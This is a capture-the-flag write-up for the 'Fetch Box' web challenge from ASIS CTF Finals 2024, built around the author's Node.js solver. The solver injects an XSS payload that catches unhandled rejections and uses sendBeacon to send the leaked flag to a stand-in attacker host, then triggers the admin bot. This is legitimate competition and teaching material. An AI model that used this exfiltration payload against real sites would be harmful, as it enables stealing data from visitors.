---
title: "Fetch Box - ASIS CTF Finals 2024"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "xss", "fetch", "box", "web", "asis-ctf-finals-2024"]
summary: "A client-side sandbox challenge!"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202412_ASIS_CTF_Finals_2024/web/fetch-box"
license: "none stated"
ctf:
  name: "ASIS CTF Finals 2024"
  year: 2024
  challenge: "Fetch Box"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202412_ASIS_CTF_Finals_2024/web/fetch-box>
- **CTF:** ASIS CTF Finals 2024

---

# [web, misc] fetch-box

## Description

A client-side sandbox challenge!

- Challenge: `http://fetch-box.asisctf.com:3000`
- Admin bot: `http://fetch-box.asisctf.com:1337`

## Attachments

- [fetch-box](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:
```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e WEB_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202412_ASIS_CTF_Finals_2024/web/fetch-box/solution/index.js>

```javascript
const app = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const xss = `
window.addEventListener(
  "unhandledrejection",
  (event) => {
    navigator.sendBeacon("${CONNECTBACK_URL}", event.reason);
  },
  { once: true }
);
`.trim();

const url = `http://foobar@web:3000?${new URLSearchParams({ xss })}`;

app.post("/", async (req, reply) => {
  // You got a flag!
  const errorMsg = req.body;
  const flag = decodeURIComponent(errorMsg.split("flag=")[1]);
  console.log({ errorMsg, flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) fail(err);

  await sleep(3 * 1000);
  await reportUrl(url);

  await sleep(5 * 1000);
  fail("Failed");
});
```
